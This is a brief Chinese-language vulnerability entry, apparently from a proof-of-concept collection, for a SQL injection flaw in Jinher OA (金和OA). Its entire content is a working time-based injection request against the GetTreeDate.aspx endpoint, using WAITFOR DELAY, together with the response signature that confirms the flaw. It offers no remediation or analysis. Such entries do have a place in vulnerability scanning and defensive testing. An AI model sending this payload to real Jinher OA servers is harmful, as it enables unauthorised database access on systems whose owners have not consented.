# 金和OASQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **请求**：`GET /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1;WAITFOR+DELAY+%270:0:5%27+--%20and%201=1 HTTP/1.1`
- **响应特征**：200 GetTreeDate.aspx